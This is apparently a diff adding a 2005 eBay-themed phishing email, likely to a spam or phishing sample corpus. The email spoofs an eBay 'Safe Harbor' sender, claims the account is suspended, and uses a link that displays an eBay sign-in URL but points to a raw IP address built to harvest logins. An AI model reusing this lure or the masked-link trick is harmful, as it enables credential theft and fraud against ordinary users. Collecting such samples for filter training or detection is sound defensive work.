@@ -1,0 +1,78 @@
+Return-Path: <root@serv-2-5-149.lycos-vds.com>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 8873 invoked by uid 115); 9 Jun 2005 13:54:53 -0000
+Received: from root@serv-2-5-149.lycos-vds.com by churchill by uid 64011 with qmail-scanner-1.22 
+ ( Clear:RC:0(84.244.5.149):. 
+ Processed in 0.399224 secs); 09 Jun 2005 13:54:53 -0000
+Received: from serv-2-5-149.lycos-vds.com (84.244.5.149)
+  by churchill.factcomp.com with SMTP; 9 Jun 2005 13:54:50 -0000
+Received: from serv-2-5-149.lycos-vds.com (localhost [127.0.0.1])
+	by serv-2-5-149.lycos-vds.com (8.12.8/8.12.8) with ESMTP id j59DuBTk024601
+	for <bruceg@em.ca>; Thu, 9 Jun 2005 14:56:11 +0100
+Received: (from root@localhost)
+	by serv-2-5-149.lycos-vds.com (8.12.8/8.12.8/Submit) id j59DuAs0024594;
+	Thu, 9 Jun 2005 14:56:10 +0100
+Date: Thu, 9 Jun 2005 14:56:10 +0100
+Message-Id: <200506091356.j59DuAs0024594@serv-2-5-149.lycos-vds.com>
+To: bruceg@em.ca
+Subject: FPA NOTICE : eBay User Suspension
+From: Safe Harbor Department<aw-confirm@ebay.com>
+Content-Type: text/html
+Content-Length: 2545
+
+
+<html>
+
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Subject</title>
+</head>
+
+<body>
+
+<table cellSpacing="0" cellPadding="0" width="100%" border="0">
+</table>
+<table cellSpacing="0" cellPadding="0" width="100%" border="0">
+</table>
+<p>
+<a href="http://pages.ebay.com/">
+  <img src="https://securepics.ebaystatic.com/aw/pics/register/HeaderRegisterUS_387x40.gif" alt="From collectibles to cars, buy and sell all kinds of items on eBay" border="0" width="387" height="40"></a></p>
+<table cellSpacing="0" cellPadding="4" width="100%" border="0">
+  <tr>
+    <td bgColor="#ffffff">Dear eBay user,<br>
+    <br>
+    Due to recent activity, including possible unauthorised listings placed on 
+    your account, we have temporarily suspended activity on your account in 
+    order to allow us to investigate this matter further. If you believe that 
+    this action may have been taken in error, or, if you feel that your account 
+    may have been tampered with, please respond to this message so that we can 
+    provide additional information and work with you to resolve this issue.
+    Please login into your account at this link and follow the instruction, step 
+    by step:
+  <a target="_blank" href="http://84.244.5.149/ws/verify.html">https://signin.ebay.com/ws/eBayISAPI.dll?SignIn</a></font><br>
+    <br>
+    After responding to the message, we ask that you allow at least 72 hours for 
+    the case to be investigated. Emailing us before that time will result in 
+    delays. We apologise in advance for any inconvenience this may cause you and 
+    we would like to thank you for your cooperation as we review this matter.<p><br>
+    If you have received this notice and you are not the authorised account 
+    holder, please be aware that it is a violation of eBay policy to represent 
+    oneself as another eBay user. Such action may also be in violation of local, 
+    national, and/or international law. eBay is committed to assist law 
+    enforcement with any inquires related to attempts to misappropriate personal 
+    information with the intent to commit fraud or theft. Information will be 
+    provided at the request of law enforcement agencies to ensure that 
+    perpetrators are prosecuted to the fullest extent of the law.<br>
+    <br>
+    Best Wishes,<br>
+    <br>
+    eBay Trust and Safety<br>
+    eBay International AG</td>
+  </tr>
+</table>
+
+</body>
+
+</html>
